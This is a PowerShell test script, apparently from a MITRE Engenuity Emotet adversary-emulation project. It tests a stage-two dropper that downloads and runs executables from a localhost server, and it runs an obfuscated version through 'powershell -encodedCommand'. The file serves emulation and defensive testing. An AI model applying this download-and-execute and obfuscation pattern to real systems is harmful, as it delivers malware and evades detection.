#=============================================================================================
#
#       Filename:  drop_emotet_stage2_test.ps1
#
#    Description:  This program tests functionality of drop_emotet_stage2.ps1.
#   
#        Version:  1.1
#        Created:  March 1st, 2021
#
#      Author(s):  Michael C. Long II
#   Organization:  MITRE Engenuity
#
#  References(s): N/A
#
#=============================================================================================


#===============================================================================
#   Console Output functions
#===============================================================================
function Write-Success() {
    Write-Host "....Test Passed!`n" -ForegroundColor Green
}

function Write-TestInfo() {
    param (
        $message
    )
    Write-Host $message -ForegroundColor Yellow
}

function Write-Failure() {
    param (
        $output_received,
        $output_expected
    )
    Write-Host "-------------------------------------------------"
    Write-Host "Test Failed!!!" -ForegroundColor Red
    Write-Host "-------------------------------------------------"
    Write-Host "[Received Output]:" -ForegroundColor Yellow
    Write-Host $output_received
    Write-Host "-------------------------------------------------"
    Write-Host "[Output Expected]:" -ForegroundColor Yellow
    Write-Host $output_expected
    Write-Host "-------------------------------------------------"
    Exit
}

#===============================================================================
#   Setups and Tear Downs
#===============================================================================
function Start-WebServer() {
    Start-Process cmd.exe -ArgumentList "/C python -m http.server --bind 127.0.0.1 8080"
    Start-Sleep 1
}

function Stop-WebServer() {
    Stop-Process -Name python
    Start-Sleep 2
}

function Remove-TestDir($test_dir) {
    Remove-Item -Recurse -Force $test_dir
}


#===============================================================================
#   Unit Tests
#===============================================================================

$directory = $env:APPDATA + "\" + "Testing"

function Invoke-UnitTest1 {
    Write-TestInfo "[Test 1]: drop_emotet_stage2.ps1 imports correctly"
    try {
        Import-Module -Name ..\drop_emotet_stage2.ps1 -Force -ErrorAction Stop
    }
    catch {
        Write-Failure -output_expected "NIL" -output_received $_.Exception.Message
    }
    Write-Success
}

function Invoke-UnitTest2 {
    Write-TestInfo "[Test 2]: drop_emotet_stage2.ps1 can download and execute a portable executable (.exe)."

    # Setup test
    Start-WebServer

    # Execute test
    try {
        Import-Module -Name ..\drop_emotet_stage2.ps1 -Force -ErrorAction Stop
        Get-EmotetExecutable -URL http://localhost:8080/test_program.exe -OutDir $directory -OutFile "test_program.exe"
    }
    catch {
        Write-Failure -output_expected "NIL" -output_received $_.Exception.Message
    }
    Write-Success

    # Tear down test
    Stop-WebServer
    Remove-Item $directory\test_program.exe
    Remove-Item $directory

}
function Invoke-UnitTest3 {
    Write-TestInfo "[Test 3]: obfuscate_stage2_dropper.py successfully obfuscates drop_emotet_stage2.ps1 based on test_config.yaml"

    # Execute test
    try {
        python ..\obfuscators\obfuscate_stage2_dropper.py -c 'test_config.yaml' -i "..\drop_emotet_stage2.ps1" -o "encoded_emotet_stage2_dropper.ps1" -v
    }
    catch {
        Write-Failure -output_expected "NIL" -output_received $_.Exception.Message
    }
    Write-Success
    
    Remove-Item encoded_emotet_stage2_dropper.ps1
}

function Invoke-UnitTest4 {
    Write-TestInfo "[Test 4]: Obfuscated script can execute successfully."

    # Setup test
    Start-WebServer
    python ..\obfuscators\obfuscate_stage2_dropper.py -c 'test_config.yaml' -i "..\drop_emotet_stage2.ps1" -o "encoded_emotet_stage2_dropper.ps1"

    # Execute test
    try {
        $encoded = Get-Content encoded_emotet_stage2_dropper.ps1
        powershell.exe -encodedCommand $encoded
    }
    catch {
        Write-Failure -output_expected "NIL" -output_received $_.Exception.Message
    }
    Write-Success

    # Tear down test
    Stop-WebServer
    Remove-Item $directory\test_program.exe
    Remove-Item $directory
    Remove-Item encoded_emotet_stage2_dropper.ps1
}

function Invoke-UnitTest5 {
    Write-TestInfo "[Test 5]: drop_emotet_stage2.ps1 can download over HTTPS with self-signed TLS certs."

    # Setup HTTPS server
    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=US/ST=VA/L=McLean/O=Dis/CN=www.mitre-engenuity.org" -keyout server.pem  -out server.pem
    Start-Sleep 1
    Start-Process cmd.exe -ArgumentList "/C python https_server.py"
    Start-Sleep 1

    # Execute test
    try {
        Import-Module -Name ..\drop_emotet_stage2.ps1 -Force -ErrorAction Stop
        Get-EmotetExecutable -URL https://localhost:4443/test_program.exe -OutDir $directory -OutFile "test_program.exe"
    }
    catch {
        Write-Failure -output_expected "NIL" -output_received $_.Exception.Message
    }
    Write-Success

    # Tear down test
    Stop-WebServer
    Remove-Item server.pem
    Remove-Item $directory\test_program.exe
    Remove-Item $directory

}

Invoke-UnitTest1
Invoke-UnitTest2
Invoke-UnitTest3
Invoke-UnitTest4
Invoke-UnitTest5